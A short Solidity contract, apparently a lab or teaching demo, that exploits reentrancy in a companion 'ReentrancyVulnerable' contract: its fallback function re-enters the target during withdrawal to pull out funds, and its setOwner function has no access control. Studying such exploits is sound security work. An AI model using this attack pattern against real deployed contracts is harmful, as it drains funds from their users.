pragma solidity >0.4.99 <0.6.0;

import "./ReentrancyVulnerable.sol";

contract ReentrancyAttacker {
  address payable private owner;
  ReentrancyVulnerable private vulnerable;

  constructor(address _vulnerableAddr) public {
    owner = msg.sender;
    vulnerable = ReentrancyVulnerable(_vulnerableAddr);
  }

  function setOwner(address payable _owner) public {
    owner = _owner;
  }

  function () payable external {
    vulnerable.transfer(owner, msg.value);
  }

  function deposit() payable public {
    vulnerable.deposit.value(msg.value)();
  }

  function withdraw() public {
    vulnerable.withdraw();
    require(owner.send(address(this).balance));
  }
}
